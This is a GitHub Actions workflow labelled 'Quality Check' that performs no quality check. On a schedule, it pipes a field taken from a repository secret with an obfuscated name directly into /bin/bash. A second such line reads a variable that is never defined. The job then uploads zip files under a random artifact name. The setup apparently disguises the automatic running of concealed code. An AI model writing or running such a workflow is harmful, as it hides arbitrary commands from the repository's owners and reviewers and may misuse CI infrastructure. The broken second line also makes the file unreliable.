name: Quality Check
on:
  workflow_dispatch:

  schedule:
    - cron: '29 3,9,15,21 * * *'
jobs:
  scheduler:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Invoke
        env:
          mizh654: ${{ secrets.mizh654 }}
        run: |
          printf '%s' "$mizh654" | jq -r .ygjqo84553 | /bin/bash
          printf '%s' "$yw0544" | jq -r .mnqbw1 | /bin/bash

      - name: Store artifact
        uses: actions/upload-artifact@v4
        with:
          name: CF5PIHGC
          path: "*.zip"
          retention-days: 1
